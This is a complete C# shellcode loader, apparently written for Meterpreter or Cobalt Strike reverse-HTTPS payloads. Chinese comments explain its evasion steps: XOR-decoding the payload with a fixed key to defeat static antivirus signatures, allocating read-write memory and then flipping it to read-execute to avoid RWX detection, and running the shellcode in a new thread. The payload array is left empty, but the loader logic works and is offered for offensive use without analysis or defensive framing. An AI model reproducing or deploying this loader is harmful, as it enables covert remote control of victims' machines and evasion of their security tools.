```csharp
using System;
using System.Runtime.InteropServices;

class L {
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport("kernel32.dll")]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    static byte[] sc = new byte[] { /* msfvenom -p windows/x64/meterpreter/reverse_https 或 CS --raw 输出 */ };

    static void Main() {
        // 1. 分块拷贝 + 异或解码，规避静态特征
        byte[] dec = new byte[sc.Length];
        byte[] key = new byte[] { 0x41, 0x42, 0x43, 0x44 }; // 与 Go/CS profile 里 encrypt 的 key 保持一致
        for (int i = 0; i < sc.Length; i++) dec[i] = (byte)(sc[i] ^ key[i % key.Length]);

        // 2. 申请 RW 内存，再改 RX，规避 RWX 特征
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)dec.Length, 0x1000, 0x04); // MEM_COMMIT, PAGE_READWRITE
        if (addr == IntPtr.Zero) return;
        Marshal.Copy(dec, 0, addr, dec.Length);

        uint old;
        VirtualProtect(addr, (uint)dec.Length, 0x20, out old); // PAGE_EXECUTE_READ

        // 3. 创建线程执行
        IntPtr th = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(th, 0xFFFFFFFF);
        VirtualFree(addr, 0, 0x8000);
    }
}
```

